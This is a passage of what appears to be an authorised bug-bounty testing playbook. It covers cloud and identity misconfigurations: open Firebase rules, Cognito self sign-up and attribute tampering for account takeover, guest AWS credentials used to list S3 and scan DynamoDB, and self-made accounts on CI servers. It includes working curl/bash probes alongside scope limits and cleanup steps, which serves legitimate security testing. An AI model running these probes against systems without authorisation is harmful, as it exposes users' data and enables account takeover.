  curl -sS "${HDR[@]}" "$C?restype=container&comp=list&maxresults=50&${U#*\?}" | grep -oE '<Name>[^<]+' | head -50
  # 4. A's own upload URL used a second time after the application accepted the first file
  #    (first.png and second.png: two small images of ours that look different)
  PU='<pre-signed PUT URL the application gave A for an upload>'
  curl -sS "${HDR[@]}" -X PUT -H 'Content-Type: image/png' --data-binary @"$D/first.png" -o /dev/null -w '%{http_code} first upload\n' "$PU"
  #    wait until the application shows the file as accepted (scanned, thumbnailed, approved), then:
  curl -sS "${HDR[@]}" -X PUT -H 'Content-Type: image/png' --data-binary @"$D/second.png" -o /dev/null -w '%{http_code} second upload\n' "$PU"
  ```
- **Proof:** A's minting request with B's id, key or traversal, the signed URL it returned, and the bytes of B's own
  test file fetched with that URL, beside B's view of the same file; or the decoded token (`sr=c`, `sp=rl`, an `se`
  a year away) with the listing that shows B's blob name; or, for the upload URL, the second PUT's 200 and the
  application serving the second image where it had accepted the first. B is our own account; no other user's
  object is opened.
- **Not a finding when:** the URL opens for anyone who holds it: a pre-signed URL is a bearer link by design and
  sharing it is the feature. The signer returns a URL for B's key and the storage answers `AccessDenied` or
  `SignatureDoesNotMatch`: the signer's own role cannot read it. Lifetime alone: SigV4 links cannot exceed seven
  days, links signed with temporary credentials die with them, and a long expiry on our own object is informative on
  most programmes. A SAS with `sr=b` and `sp=r` for our own blob is the design. The second upload succeeds and the
  application never serves or reads the replaced bytes. A signed upload with an attacker-chosen key or content type
  belongs to the upload chapter.
- **Escalate:** a signer that signs any key reads every user's files: stop at B's and state whether keys are
  guessable (sequential ids, user ids in the path, predictable names). A SAS with `w` or `d` over the container lets
  whoever holds A's link change other users' blobs: show it only on a new blob of our own, and only where write
  tests are allowed. CloudFront cookies with a wildcard `Resource` give A every private object behind the
  distribution: B's file is the proof. An upload URL that replaces checked content after the check is how a cache or
  package gets poisoned (#2255750): describe what reads the object afterwards. #2337427 ($2,000) and #254200 are the
  same family: an authentication bypass through a pre-signed URL, and a file name that climbed out of its S3 folder.

### CLD-005 · The Firebase project's security rules let an unauthenticated client, or a user we register with its public API key, read or write data it does not own

| | |
|---|---|
| **Severity** | Critical standalone when anyone can write to the database or bucket, or read other users' personal data or credentials; High for reading other users' records; Medium for non-personal internal data; None for data the application publishes anyway |
| **Requires** | cloud-storage |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #684099, #1065134, #736283, #731724 |

- **Where:** the Firebase configuration of the asset: `/__/firebase/init.json` on sites served by Firebase Hosting,
  and the `firebaseConfig` object in its bundles (`apiKey`, `databaseURL`, `projectId`, `storageBucket`). Paths and
  collection names come from the client code: `ref("...")`, `child("...")`, `collection("...")`, `doc("...")`. The
  fingerprinter sets `cloud-storage` on `firebaseio.com` and `firebasestorage.googleapis.com` names but not on
  Firestore alone: an `apiKey` beginning `AIza` with a `projectId` beside it is enough to set the fact and run this.
- **Test:** the rules decide every read and write, and three rules keep reappearing: `".read": true` on the Realtime
  Database root, `allow read, write: if true`, and `allow read, write: if request.auth != null`, which any user the
  project lets sign up satisfies. Ask each store with no token; then sign in with the project's own public API key
  (anonymous sign-in, or an e-mail user under the programme's alias rule) and ask again; then, with A's and B's own
  application accounts, read B's records as A.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-005"; mkdir -p "$D"; U=$(jq -r '.authorisation.h1_username // empty' "$E/engagement.json"); U=${U:-researcher}
  curl -sS "${HDR[@]}" -o "$D/init.json" -w '%{http_code} /__/firebase/init.json\n' "$T/__/firebase/init.json"
  RX="(apiKey|databaseURL|projectId|storageBucket)[\"']?[[:space:]]*:[[:space:]]*[\"'][^\"']+"
  { cat "$D/init.json"; grep -rhoE "$RX" "$E/recon/$H/" 2>/dev/null; } | grep -oE "$RX" | sed -E "s/[\"'[:space:]]//g; s/:/=/" | sort -u | tee "$D/config.txt"
  v(){ awk -F= -v k="$1" '$1==k{print $2; exit}' "$D/config.txt"; }        # several projects (dev, prod): one pass each
  KEY=$(v apiKey); PID=$(v projectId); SB=$(v storageBucket); DB=$(v databaseURL); DB=${DB:-https://$PID-default-rtdb.firebaseio.com}
  FS="firestore.googleapis.com/v1/projects/$PID/databases/(default)/documents"
  grep -rhoE "(ref|child|collection|doc|collectionGroup)\([\"'][A-Za-z0-9_/-]{2,60}[\"']" "$E/recon/$H/" 2>/dev/null | grep -oE "[\"'][^\"']+" | tr -d "\"'" \
    | cut -d/ -f1 | sort | uniq -c | sort -rn | head -15 | tee "$D/paths.txt"
  # 1. every store with no token; mask.fieldPaths=sane_none returns document names without field values
  curl -sS "${HDR[@]}" -o "$D/rtdb.anon.json" -w '%{http_code} realtime database root, no token\n' "$DB/.json?shallow=true"; head -c 300 "$D/rtdb.anon.json"; echo
  for c in $(awk '{print $2}' "$D/paths.txt"); do
    curl -sS "${HDR[@]}" -o "$D/fs-$c.anon.json" -w "%{http_code} firestore $c, no token\n" "https://$FS/$c?pageSize=3&mask.fieldPaths=sane_none&key=$KEY"; sleep 1; done
  curl -sS "${HDR[@]}" -o "$D/storage.anon.json" -w '%{http_code} storage listing, no token\n' "https://firebasestorage.googleapis.com/v0/b/$SB/o?maxResults=10&delimiter=/"
  grep -c '"name"' "$D"/fs-*.anon.json; jq -c '{prefixes, items: [.items[]?.name], error: .error.message}' "$D/storage.anon.json"
  ```
  ```bash
  # 2. a token from the project itself: anonymous sign-in first, an e-mail user under the programme's alias rule if that is off.
  #    identitytoolkit.googleapis.com is Google's sign-in API for this project: the scope guard refuses this POST until
  #    the host is recorded in $E/allow-infra.txt (add the project id as a comment).
  su(){ curl -sS "${HDR[@]}" -H "Referer: $T/" -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$KEY" -H 'Content-Type: application/json' -d "$1"; }
  su '{"returnSecureToken":true}' > "$E/accounts/cld005.json"
  jq -e .idToken "$E/accounts/cld005.json" >/dev/null || su "{\"email\":\"$U+cld005@wearehackerone.com\",\"password\":\"Sane-$(openssl rand -hex 8)\",\"returnSecureToken\":true}" > "$E/accounts/cld005.json"
  jq -c '{localId, error: .error.message}' "$E/accounts/cld005.json"
  echo "$(date -u +%FT%TZ) Firebase user $(jq -r .localId "$E/accounts/cld005.json") in $PID created by CLD-005" >> "$D/cleanup.md"
  ```
  ```bash
  # 3. the same reads as that project user, then B's record read with A's token (A's and B's ID tokens and uids from
  #    their browser storage, key firebase:authUser:<apiKey>:[DEFAULT]; "users" stands for the per-user collection in paths.txt)
  TOK=$(jq -r '.idToken // empty' "$E/accounts/cld005.json")
  curl -sS "${HDR[@]}" -o "$D/rtdb.tok.json" -w '%{http_code} realtime database root, project user\n' "$DB/.json?shallow=true&auth=$TOK"
  for c in $(awk '{print $2}' "$D/paths.txt"); do
    curl -sS "${HDR[@]}" -H "Authorization: Bearer $TOK" -o "$D/fs-$c.tok.json" -w "%{http_code} firestore $c, project user\n" "https://$FS/$c?pageSize=3&mask.fieldPaths=sane_none"; sleep 1; done
  curl -sS "${HDR[@]}" -H "Authorization: Firebase $TOK" -o "$D/storage.tok.json" -w '%{http_code} storage listing, project user\n' "https://firebasestorage.googleapis.com/v0/b/$SB/o?maxResults=10&delimiter=/"
  AT='<A ID token>'; BUID='<B uid>'
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $AT" -w '\n%{http_code} B record with A token\n' "https://$FS/users/$BUID?mask.fieldPaths=email"
  # 4. only when the policy allows write tests: one new key, read back, deleted (never PUT or PATCH an existing path)
  curl -sS "${HDR[@]}" -X PUT -w ' %{http_code} write\n' "$DB/h1-$U-cld005.json?auth=$TOK" -d "{\"note\":\"harmless test by HackerOne user $U\",\"at\":\"$(date -u +%FT%TZ)\"}"
  curl -sS "${HDR[@]}" -w ' %{http_code} read back\n' "$DB/h1-$U-cld005.json?auth=$TOK"
  curl -sS "${HDR[@]}" -X DELETE -w ' %{http_code} delete\n' "$DB/h1-$U-cld005.json?auth=$TOK"
  ```
  ```bash
  # 5. remove the project user created in step 2 (the same recorded host as step 2)
  curl -sS "${HDR[@]}" -H "Referer: $T/" -X POST "https://identitytoolkit.googleapis.com/v1/accounts:delete?key=$KEY" -H 'Content-Type: application/json' \
    -d "{\"idToken\":\"$(jq -r .idToken "$E/accounts/cld005.json")\"}" -w ' %{http_code} user deleted\n'
  ```
- **Proof:** the request with no token, or with the project user's token, and its answer: the shallow root keys of
  the Realtime Database, Firestore document names in a collection of user records, the Storage listing; for the
  cross-user read, B's record in A's response next to B's own view. Values are not pasted: key names, document counts
  and our own B's fields only. For a write, the PUT, the read-back and the DELETE with timestamps. State how the
  token was obtained (anonymous sign-in, or an e-mail user created with the public API key) and that the user was
  deleted.
- **Not a finding when:** `Permission denied` (Realtime Database) or `PERMISSION_DENIED: Missing or insufficient
  permissions` (Firestore, Storage) on every path, with and without the token: the rules hold. `null` from `/.json`
  is an empty database or an allowed read of an empty path: no data, no finding. Data the application shows every
  visitor anyway (a public catalogue, a leaderboard of display names). The API key and the configuration themselves
  are public by design (INF-004). A token from an account the application gives anyone at sign-up that reads only
  its own records is the rules working. The project belongs to a vendor's widget, not to the organisation
  (`third-party`). `API_KEY_HTTP_REFERRER_BLOCKED` means the key is restricted to the site's origin; the `Referer:
  $T/` header in the commands is what the browser itself sends.
- **Escalate:** a writable root lets anyone replace the application's data (#684099 and #1065134, both titled
  database takeovers): prove it with a new key of ours only, never on an existing path. Storage listings name other
  users' files: names and counts, and one file of B's. Callable functions named in the bundles
  (`httpsCallable("...")`, `https://<region>-<project>.cloudfunctions.net/<name>`) are entry points for CLD-013. An
  account created through `accounts:signUp` on a project whose application offers no sign-up is the same flaw as
  CLD-006, reported with what that account could read. A role or plan the application reads from a document the user
  can write is API-001 or BAC-014.

### CLD-006 · The Cognito user pool behind a staff, partner or invite-only login accepts a self sign-up through its public app client

| | |
|---|---|
| **Severity** | High standalone when the account we create signs in to the application and reaches its non-public data or functions; Critical with CLD-008 when the new user's token buys AWS credentials with production reach; None when the application turns the new user away |
| **Requires** | login, !signup |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Authentication Bypass Using an Alternate Path or Channel · CWE-288 |
| **Prior art** | #3287396, #4071064, #1342088 |

- **Where:** login pages that offer no registration (a staff portal, a partner or supplier portal, an admin
  console, an invite-only product) and run on Cognito: a user-pool id (`<region>_<id>`) and a 26-character app
  client id in the bundles (`aws_user_pools_id`, `userPoolId`, `aws_user_pools_web_client_id`, `userPoolWebClientId`,
  `ClientId`), calls to `cognito-idp.<region>.amazonaws.com` with an `X-Amz-Target:
  AWSCognitoIdentityProviderService.*` header, or a hosted login at `<prefix>.auth.<region>.amazoncognito.com`. With
  none of these the item is negative for this asset. The two self-registration reports cited reached an internal
  chat with proprietary models (#3287396) and a supplier procurement portal (#4071064); their titles do not name the
  identity provider.
- **Test:** the interface hides registration, but the user pool decides. Unless only administrators may create
  users, `SignUp` with the public client id creates an account, and the application often trusts any token its pool
  signs. Call `SignUp` with an address under the programme's alias rule, confirm it, sign in, and present the tokens
  to the application.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-006"; mkdir -p "$D"; U=$(jq -r '.authorisation.h1_username // empty' "$E/engagement.json"); U=${U:-researcher}
  POOL=$(grep -rhoE '(us|eu|ap|ca|sa|me|af|il|mx)(-gov)?-[a-z]+-[0-9]_[A-Za-z0-9]{8,12}' "$E/recon/$H/" | sort | uniq -c | sort -rn | awk 'NR==1{print $2}')
  CID=$(grep -rhoE "(userPoolWebClientId|aws_user_pools_web_client_id|userPoolClientId|user_pool_client_id|ClientId|clientId)[\"']?[[:space:]]*:[[:space:]]*[\"'][a-z0-9]{26}" "$E/recon/$H/" \
    | grep -oE '[a-z0-9]{26}$' | sort | uniq -c | sort -rn | awk 'NR==1{print $2}')
  RG=${POOL%%_*}; IDP="cognito-idp.$RG.amazonaws.com"; MAIL="$U+cld006@wearehackerone.com"; echo "pool=$POOL client=$CID"
  PW="Sane-$(openssl rand -hex 6)-Aa1#"; printf '%s\n' "$PW" > "$E/accounts/cld006.password"
  cog(){ curl -sS "${HDR[@]}" -X POST "https://$IDP/" -H 'Content-Type: application/x-amz-json-1.1' -H "X-Amz-Target: AWSCognitoIdentityProviderService.$1" -d "$2"; echo; }
  cog SignUp "{\"ClientId\":\"$CID\",\"Username\":\"$MAIL\",\"Password\":\"$PW\",\"UserAttributes\":[{\"Name\":\"email\",\"Value\":\"$MAIL\"}]}" | tee "$D/signup.json"
  echo "$(date -u +%FT%TZ) Cognito user $MAIL in $POOL created by CLD-006 (DeleteUser at the end)" >> "$D/cleanup.md"
  # "SignUp is not permitted for this user pool" ends the item. UserConfirmed false: confirm with the code from our inbox
  cog ConfirmSignUp "{\"ClientId\":\"$CID\",\"Username\":\"$MAIL\",\"ConfirmationCode\":\"<code from the e-mail>\"}"
  cog InitiateAuth "{\"ClientId\":\"$CID\",\"AuthFlow\":\"USER_PASSWORD_AUTH\",\"AuthParameters\":{\"USERNAME\":\"$MAIL\",\"PASSWORD\":\"$PW\"}}" > "$E/accounts/cld006.json"
  #   "USER_PASSWORD_AUTH flow not enabled for this client": sign in through the application's own login form with the same pair
  jq -r '.AuthenticationResult.IdToken // empty' "$E/accounts/cld006.json" | cut -d. -f2 | jq -R 'gsub("-";"+") | gsub("_";"/") | @base64d | fromjson | {sub, email, "cognito:groups", aud, iss}'
  # the application with the new user's token, the way its own requests send it: one page or API call, nothing more
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $(jq -r .AuthenticationResult.IdToken "$E/accounts/cld006.json")" \
    -o "$D/app-as-new-user.json" -w '%{http_code} application as the new user\n' "$T/api/me"
  # clean-up: the user deletes itself
  cog DeleteUser "{\"AccessToken\":\"$(jq -r .AuthenticationResult.AccessToken "$E/accounts/cld006.json")\"}"
  ```
- **Proof:** the `SignUp` response (`UserSub`, `UserConfirmed`, `CodeDeliveryDetails`), the sign-in result, the
  decoded token claims, and one answer of the application to the new user that a stranger should not get (the
  internal dashboard's title, our own profile inside the internal tenant, the names in one list), beside the login
  page offering no registration and the page or policy text that says who the application is for. State that the
  user carried our alias and deleted itself.
- **Not a finding when:** `NotAuthorizedException: SignUp is not permitted for this user pool` (administrators
  only). `Unable to verify secret hash for client`: the client has a secret and is not public, so there is nothing
  to call without it. A pre-sign-up trigger rejects addresses outside the organisation's domains (`PreSignUp failed
  with error`): use our own alias only, never an address we do not own. The pool signs the token and the application
  refuses the user (`not authorised`, an empty account, a check on `cognito:groups`): the application holds the
  line, so record where. The application is meant for the public and registration only lives elsewhere (a mobile
  app, a "request access" form that creates users anyway): read the product before calling it internal.
- **Escalate:** inside, the new user is attacker A for the access-control chapter. Its ID token is a login for the
  identity pool, if there is one: CLD-008 with `Logins` returns the authenticated role's AWS credentials, often wider
  than the unauthenticated role's. Writable attributes on the new user (`custom:*`) are CLD-007. The same shape
  exists beyond Cognito: Auth0 `POST /dbconnections/signup` with the public client id and connection name, Firebase
  `accounts:signUp` with the web API key (CLD-005). #1342088 is the index's one Cognito report, an account takeover
  through the same API.

### CLD-007 · A Cognito user changes an attribute the application trusts for identity or role, such as email or custom:role, through the user-pool API

| | |
|---|---|
| **Severity** | Critical standalone when an unverified e-mail change makes the application treat our account as the second account (account takeover); High when a writable custom attribute raises our role or moves us into the second account's tenant; None when the application ignores the changed claim |
| **Requires** | login, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #1342088, #1018489, #565883 |

- **Where:** applications whose login runs on Cognito (pool and client ids in the bundles, `cognito-idp` calls,
  tokens in browser storage under `CognitoIdentityServiceProvider.<client id>.<user>.idToken`). Decode A's ID token:
  the claims it carries (`email`, `email_verified`, `custom:role`, `custom:tenant_id`, `custom:org`, `custom:plan`,
  `preferred_username`, `phone_number`) are the candidates, and the application's requests show which it reads (a
  tenant it knows without being told, a role it shows without asking).
- **Test:** an app client may write every attribute unless its write permissions were narrowed, and a user may call
  `UpdateUserAttributes` with its own access token. An e-mail change takes effect at once and is marked unverified,
  unless the pool keeps the old value until the new one is verified. An application that keys identity on the
  `email` claim (#1342088), or trusts an e-mail nobody proved (#1018489, #565883), or reads a role or tenant from a
  writable attribute, turns A into B or into an administrator. Change one attribute at a time on A, refresh A's
  tokens, present them to the application, and revert.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-007"; mkdir -p "$D"
  # A's tokens: InitiateAuth with A's password, or copied from A's browser storage; saved as {"AccessToken","IdToken","RefreshToken"}
  AT=$(jq -r .AccessToken "$E/accounts/A.cognito.json"); RT=$(jq -r .RefreshToken "$E/accounts/A.cognito.json")
  POOL='<user-pool id from the bundles>'; CID='<app client id>'; RG=${POOL%%_*}; IDP="cognito-idp.$RG.amazonaws.com"
  cog(){ curl -sS "${HDR[@]}" -X POST "https://$IDP/" -H 'Content-Type: application/x-amz-json-1.1' -H "X-Amz-Target: AWSCognitoIdentityProviderService.$1" -d "$2"; echo; }
  jwt(){ cut -d. -f2 <<< "$1" | jq -R 'gsub("-";"+") | gsub("_";"/") | @base64d | fromjson'; }
  cog GetUser "{\"AccessToken\":\"$AT\"}" | tee "$D/a-before.json" | jq -c '[.UserAttributes[] | {(.Name): .Value}] | add'
  # 1. a custom attribute, set to the value B's tenant or our admin account carries (read from B's or ADM's own ID token)
  cog UpdateUserAttributes "{\"AccessToken\":\"$AT\",\"UserAttributes\":[{\"Name\":\"custom:tenant_id\",\"Value\":\"<B tenant id>\"}]}" | tee "$D/update-custom.json"
  # 2. the e-mail: A's address set to B's (our own second account); Cognito sends B a code, which is never entered
  cog UpdateUserAttributes "{\"AccessToken\":\"$AT\",\"UserAttributes\":[{\"Name\":\"email\",\"Value\":\"<B e-mail>\"}]}" | tee "$D/update-email.json"
  cog GetUser "{\"AccessToken\":\"$AT\"}" | tee "$D/a-after.json" | jq -c '[.UserAttributes[] | {(.Name): .Value}] | add'
  # 3. fresh tokens carry the new claims; the application gets the new ID token where it normally takes A's
  cog InitiateAuth "{\"ClientId\":\"$CID\",\"AuthFlow\":\"REFRESH_TOKEN_AUTH\",\"AuthParameters\":{\"REFRESH_TOKEN\":\"$RT\"}}" > "$E/accounts/A.cognito.new.json"
  NEW=$(jq -r .AuthenticationResult.IdToken "$E/accounts/A.cognito.new.json"); jwt "$NEW" | jq '{sub, email, email_verified, "custom:tenant_id", "custom:role"}'
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $NEW" -o "$D/app-with-new-token.json" -w '%{http_code} application with the changed claims\n' "$T/api/me"
  # 4. revert: the custom attribute to A's value, A's own address back (verified with the code that A receives)
  cog UpdateUserAttributes "{\"AccessToken\":\"$AT\",\"UserAttributes\":[{\"Name\":\"custom:tenant_id\",\"Value\":\"<A tenant id>\"},{\"Name\":\"email\",\"Value\":\"<A e-mail>\"}]}"
  cog VerifyUserAttribute "{\"AccessToken\":\"$AT\",\"AttributeName\":\"email\",\"Code\":\"<code sent to A>\"}"
  ```
- **Proof:** `GetUser` before and after, showing that A's own token changed the attribute; the refreshed ID token's
  claims (`email` now B's address with `email_verified: false`, or the custom attribute carrying B's tenant or the
  administrator's role); and the application's answer to that token: B's profile or B's tenant data, or a function
  only an administrator has, beside the same request with A's old token. Then the revert, and A's attributes as they
  were.
- **Not a finding when:** `NotAuthorizedException: A client attempted to write unauthorized attribute`: the client's
  write permissions exclude it. `AliasExistsException`: the pool keeps e-mail addresses unique; the same address in
  another letter case is a separate value to Cognito and the same mailbox to an application that lower-cases it, so
  try that once and stop. `GetUser` still shows the old address after the update: the pool keeps the original value
  until the new one is verified. The application keys on `sub`, checks `email_verified`, or reads roles and tenants
  from its own database: the claim changed and nothing followed, so record which check held. Changing our own
  display name, picture or locale is the feature.
- **Escalate:** an e-mail claim the application trusts is account takeover of anyone whose address is known: show
  it on B only. The same claim may open other applications that sign in with this pool and trust its e-mail
  (AUT-013, AUT-014). A role or tenant attribute that an identity pool's role mapping reads gives a different IAM
  role: CLD-008 with the new token. `phone_number` deserves the same test where the application sends codes to it.

### CLD-008 · A Cognito identity pool gives an unauthenticated visitor AWS credentials that read or write more than the application's public data

| | |
|---|---|
| **Severity** | High standalone when the unauthenticated role lists or reads other users' objects or records, or writes where the application reads; Critical when it reaches secrets, production tables or IAM; None when it reaches only what the application already serves to anonymous visitors |
| **Requires** | http |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Incorrect Permission Assignment for Critical Resource · CWE-732 |
| **Prior art** | #1342088, #398400, #1021906 |

- **Where:** an identity-pool id (`<region>:<uuid>`) in the asset's bundles or configuration
  (`aws_cognito_identity_pool_id`, `identityPoolId`, `IdentityPoolId`, `identity_pool_id` in
  `amplify_outputs.json`), usually beside the resources the client is meant to use: `aws_user_files_s3_bucket`,
  `bucket_name`, table names, an AppSync endpoint, a Pinpoint or Kinesis id. `Requires` is only `http` because no
  fact marks Cognito; one grep settles it, and without an identity-pool id the item is negative. No report in the
  index names an identity pool: the cited ones show the Cognito API in an account takeover (#1342088) and how AWS
  credentials in outside hands and an open user-files bucket were rated (#398400, #1021906 at $2,900).
- **Test:** an identity pool that allows unauthenticated access gives anyone temporary credentials for its
  unauthenticated role, on purpose: the client uses them for uploads, analytics or maps. The flaw is the role's
  policy. Get the credentials with two unauthenticated calls, name the role with one identity call, then send one
  read-only request to each resource the client code names, aimed at what an anonymous visitor should not get:
  other identities' `private/` folders, the whole bucket, a table's item count. No enumeration of other services, and
  no write unless the policy allows write tests.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-008"; mkdir -p "$D"
  grep -rhoE '(us|eu|ap|ca|sa|me|af|il|mx)(-gov)?-[a-z]+-[0-9]:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' "$E/recon/$H/" 2>/dev/null | sort -u | tee "$D/identity-pools.txt"
  grep -rhoE "(aws_user_files_s3_bucket|bucket_name|bucketName|tableName|aws_appsync_graphqlEndpoint|streamName|functionName)[\"']?[[:space:]]*:[[:space:]]*[\"'][^\"']{3,100}" "$E/recon/$H/" 2>/dev/null | sort -u | tee "$D/resources.txt"
  IP=$(head -1 "$D/identity-pools.txt"); RG=${IP%%:*}; CI="cognito-identity.$RG.amazonaws.com"
  ci(){ curl -sS "${HDR[@]}" -X POST "https://$CI/" -H 'Content-Type: application/x-amz-json-1.1' -H "X-Amz-Target: AWSCognitoIdentityService.$1" -d "$2"; }
  # 1. two calls without any login; the credentials stay in accounts/, never in evidence
  ID=$(ci GetId "{\"IdentityPoolId\":\"$IP\"}" | tee "$D/getid.json" | jq -r '.IdentityId // empty'); jq -c . "$D/getid.json"
  ci GetCredentialsForIdentity "{\"IdentityId\":\"$ID\"}" > "$E/accounts/cld008-creds.json"
  AK=$(jq -r .Credentials.AccessKeyId "$E/accounts/cld008-creds.json"); SK=$(jq -r .Credentials.SecretKey "$E/accounts/cld008-creds.json"); ST=$(jq -r .Credentials.SessionToken "$E/accounts/cld008-creds.json")
  echo "key ${AK:0:4}...${AK: -4}, expires $(jq -r .Credentials.Expiration "$E/accounts/cld008-creds.json")"
  aws4(){ curl -sS "${HDR[@]}" --aws-sigv4 "aws:amz:$1" --user "$AK:$SK" -H "x-amz-security-token: $ST" "${@:2}"; }
  # 2. which role this is
  aws4 us-east-1:sts 'https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15' | grep -oE '<(Arn|Account)>[^<]+'
  # 3. one read-only request per resource the client names: the bucket by prefix, a table by count (no items returned)
  BK=$(grep -m1 -E 'aws_user_files_s3_bucket|bucket_name|bucketName' "$D/resources.txt" | grep -oE '[a-z0-9][a-z0-9.-]+[a-z0-9]$')
  for pfx in "" public/ protected/ private/; do
    aws4 "$RG:s3" -o "$D/s3-list-${pfx%/}.xml" -w "%{http_code} list prefix '$pfx'\n" "https://$BK.s3.$RG.amazonaws.com/?list-type=2&max-keys=20&delimiter=/&prefix=$pfx"; sleep 1; done
  grep -oE '<(Code|KeyCount|Prefix)>[^<]{0,80}' "$D"/s3-list-*.xml
  DDB="dynamodb.$RG.amazonaws.com"; TB='<table name from resources.txt>'
  aws4 "$RG:dynamodb" -H 'Content-Type: application/x-amz-json-1.0' -H 'X-Amz-Target: DynamoDB_20120810.Scan' \
    -d "{\"TableName\":\"$TB\",\"Select\":\"COUNT\",\"Limit\":100}" "https://$DDB/" | jq -c '{Count, ScannedCount, type: .__type, message}'
  ```
- **Proof:** `GetId` and `GetCredentialsForIdentity` without any login (the access key cut to four characters each
  side; secret and session token never shown), `GetCallerIdentity` naming the role, and one request per reached
  resource with its answer: a `private/` listing that shows other identities' folder names (names and a count), a
  `Select: COUNT` on a table of user records. Beside it, the application's own code that uses only `public/`, or
  nothing at all, as a guest. Say what the role name and these answers imply, and that the credentials expired
  unused.
- **Not a finding when:** `Unauthenticated access is not supported for this identity pool`. The role reaches only
  analytics writes (`mobiletargeting:PutEvents`, a Kinesis or Firehose telemetry stream) and `public/` objects the
  site serves: that is what guest credentials are for, and fake analytics events are a nuisance, not a breach.
  `AccessDenied` on everything outside `public/` and the reading of `protected/`: Amplify's documented guest access
  (read `public/`, read `protected/`, write `public/` when guest uploads are on) is the design. `GetCallerIdentity`
  places the role in an account that is not the organisation's (a vendor's SDK).
- **Escalate:** with A's ID token in `Logins` (`{"cognito-idp.<region>.amazonaws.com/<pool id>": "<id token>"}` in
  both calls) the same two calls return the authenticated role: repeat the reach test, and with B, show A reading B's
  `private/` folder or B's records. A self-made user from CLD-006 does the same without an invitation. Never invoke a
  Lambda function, write a table item or touch IAM with these credentials: describe what the policy evidently allows
  from the names and answers, and stop. Writable `public/` objects that the site renders join the upload and XSS
  chapters.

### CLD-009 · A CI or code server of the organisation admits an account we create ourselves and shows it jobs, build logs, source or runners

| | |
|---|---|
| **Severity** | Critical standalone when our self-made account opens a script console, stored credentials, or runners that take its jobs; High for private source code or build logs holding secrets; Medium for job and project names only |
| **Requires** | known-product, signup\|oauth-login |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authorization · CWE-285 |
| **Prior art** | #231460, #182104, #565883, #410475 |

- **Where:** CI, code and artefact servers identified on the asset (Jenkins `X-Jenkins` header, GitLab
  `/users/sign_in`, TeamCity `/login.html`, Argo CD `/api/version`, SonarQube `/api/server/version`, Gitea
  `/user/sign_up`, Nexus, Artifactory, Harbor) whose login offers "Sign in with Google, GitHub, GitLab.com or
  Microsoft", or a register link. #231460 ($15,000) was a Jenkins that let any Google account in; #182104 a Jenkins
  behind GitHub login that gave any GitHub user the source code.
- **Test:** the server authenticates the identity provider's account and then authorises every authenticated user:
  Jenkins with "logged-in users can do anything" or `Overall/Read` and `Job/Read` for `authenticated`, GitLab's
  internal projects shown to every signed-in user, Argo CD's default read-only role for every SSO user, SonarQube
  with `Browse` on private projects for all users. Create the account with our own identity or the sign-up form
  (programme alias), then ask the server's own API what the account can see. Nothing is run, built or changed.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-009"; mkdir -p "$D"
  # sign in once in the browser with our own Google or GitHub identity, or through the sign-up form with the programme's
  # alias, and save the session headers in $E/accounts/A.headers. The control must be refused, or this is CVE-008's case.
  curl -sS -g "${HDR[@]}" -o /dev/null -w '%{http_code} anonymous control\n' "$T/api/json?tree=jobs[name]"
  # Jenkins
  curl -sS -g "${HDR[@]}" $A "$T/whoAmI/api/json" | jq -c '{name, authenticated, anonymous, authorities}'
  curl -sS -g "${HDR[@]}" $A "$T/api/json?tree=jobs[name]{0,20}" | jq -r '.jobs[]?.name' | tee "$D/jobs.txt"
  for p in /script /manage /credentials/ /computer/api/json; do curl -sS -g "${HDR[@]}" $A -o /dev/null -w "%{http_code} $p\n" "$T$p"; done
  # GitLab: internal projects an ordinary signed-in user sees, against the anonymous count
  curl -sS "${HDR[@]}" "$T/api/v4/projects?visibility=internal&per_page=20" | jq 'length'
  curl -sS "${HDR[@]}" $A "$T/api/v4/projects?visibility=internal&simple=true&per_page=20" | jq -r '.[] | [.id, .path_with_namespace, .last_activity_at] | @tsv' | tee "$D/internal-projects.tsv"
  #   instance runners a project of ours may use: create an empty private project in the UI, then read its runner list
  curl -sS "${HDR[@]}" $A "$T/api/v4/projects/<our project id>/runners?type=instance_type" | jq -c '.[] | {id, description, is_shared, online}'
  # Argo CD, SonarQube, Nexus: the same question to their own APIs
  curl -sS "${HDR[@]}" $A "$T/api/v1/applications?fields=items.metadata.name" | jq -r '.items[]?.metadata.name' | head
  curl -sS "${HDR[@]}" $A "$T/api/components/search?qualifiers=TRK&ps=20" | jq -r '.components[]?.key' | head
  curl -sS "${HDR[@]}" $A "$T/service/rest/v1/repositories" | jq -r '.[]?.name' | head
  ```
- **Proof:** how the account was made (our own Google or GitHub identity, or the sign-up form with our alias), the
  server's own statement of who we are (`whoAmI`, `/api/v4/user`, `session/userinfo`), a few job, project or
  application names it shows (names only), and the anonymous control refused. For a script console: its status and
  page title only. For runners: the list a new project of ours receives. List the account and the empty project in
  `cleanup.md` and delete the project.
- **Not a finding when:** the account lands on `Access Denied: <user> is missing the Overall/Read permission`, a
  pending-approval page or an empty dashboard. The login admits only the organisation's Google Workspace domain or
  GitHub organisation and refuses our identity. The instance is a public community server where anyone may register
  and internal projects are shared with registered users on purpose (an open-source project's GitLab): read its
  sign-up page and terms. The same data is visible without logging in: that is CVE-008's card. The service is the
  vendor's hosted product, and only the organisation's configuration on it counts (`third-party` for the rest).
- **Escalate:** describe what the account could do, and do not do it: run jobs on instance runners (a network
  position inside the organisation, with the runner's cloud metadata in reach), read credentials referenced by job
  configurations, push to repositories. Secrets in build logs or job configurations get one identity call. Source
